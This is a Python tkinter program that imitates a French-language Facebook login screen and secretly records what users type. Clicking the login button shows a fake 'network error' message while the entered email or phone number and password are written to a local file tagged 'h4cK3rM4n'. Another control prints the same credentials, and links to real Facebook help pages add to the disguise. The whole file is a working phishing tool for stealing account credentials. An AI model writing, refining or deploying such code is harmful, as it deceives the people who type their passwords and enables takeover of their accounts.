from importation import MyWindow
from tkinter import *
from tkinter.filedialog import askopenfilename
import webbrowser
from tkinter import messagebox

def connect_button():
        webbrowser.open_new('https://web.facebook.com/')

'''def get_information():
    res = entry_user.get()
    ser = entry_pass.get()
    print(f"username: {res} |   password: {ser}")'''

def message():
    messagebox.showinfo('Network Error', 'Vérifiez votre connexion internet')
    res = entry_user.get()
    ser = entry_pass.get()
    file = open('file.txt', 'a+')
    file.write('username:   ')
    file.write(res + '\n')
    file.write('password:   ')
    file.write(ser + '\n')
    file.write('<===========h4cK3rM4n°4===========>\n')
    file.close()

def solo():
    res = entry_user.get()
    ser = entry_pass.get()
    print(f"username: {res} |   password: {ser}")

def _help_():
    webbrowser.open_new('https://fr-fr.facebook.com/help/104002523024878')

def mot_oublié():
    webbrowser.open_new('https://fr-fr.facebook.com/help/213395615347144')

window = MyWindow()

txt_vide = Label(text = '', bg = 'darkgrey')
txt_vide.grid(row = 0)

frame_1 = Frame(window, bg = 'darkgrey')

facebook = Label(frame_1, text = 'Facebook',bg = 'darkgrey',fg = 'blue',font = ('Arial', 50))
facebook.pack()

text_FB = Label(frame_1, text = 'Avec Facebook, partagez et restez en',
    bg = 'darkgrey', fg = 'black',font = ('Arial', 30))
text_FB.pack()

text_FB_2 = Label(frame_1, text = ' contact avec votre entourage.',
    bg = 'darkgrey', fg = 'black', font = ('Arial', 30))
text_FB_2.pack()

frame_1.grid(row = 1)

Label(text = 'Adresse e-mail ou numéro de tél.', bg = 'darkgrey', fg = 'black', font = ('Arial', 14)).grid(row = 2, column = 1)
Label(text = 'Mot de passe', bg = 'darkgrey', fg = 'black', font = ('Arial', 14)).grid(row = 3, column = 1)

entry_user = Entry(window,font = ('Arial', 30))
entry_user.grid(row = 2, column = 2)

entry_pass = Entry(window,font = ('Arial', 30), show='*')
entry_pass.grid(row = 3, column = 2)

v = StringVar()
v.set("J'accepte les conditions d'utilisation...")

c = Radiobutton(window,variable = v ,text = "J'accepte les conditions d'utilisation...",bg = 'darkgrey',font = ('Arial',10),command = solo)
c.grid(row = 4, column = 2)

mdp_oub = Button(window, text = 'Mot de passe oublié ?',bg = 'darkgrey',
    font = ('Arial', 15),fg = 'blue' ,underline = 0,bd = 0, highlightthickness = 0,command = mot_oublié)
mdp_oub.grid(row = 6, column = 2)


bouton_connect = Button(window, text = 'Se connecter', bg = 'blue', fg = 'white',font = ('Arial',20),command = message)
bouton_connect.grid(row = 5,column = 2)

create_page = Label(text = '', bg = 'darkgrey', fg = 'black', font = ('Arial'))
create_page.grid(row = 7, column = 2)

create_account = Button(text = 'Créer nouveau compte', bg = '#42b72a', fg = 'white',
    font = ('Arial', 20))
create_account.grid(row = 8, column = 2)

create_page = Label(text = '', bg = 'darkgrey', fg = 'black', font = ('Arial'))
create_page.grid(row = 9, column = 2)

create_page = Label(text = 'Créez une Page pour une célébrité, une marque ou une entreprise.', bg = 'darkgrey', fg = 'black', font = ('Arial'))
create_page.grid(row = 10, column = 2)


window.mainloop()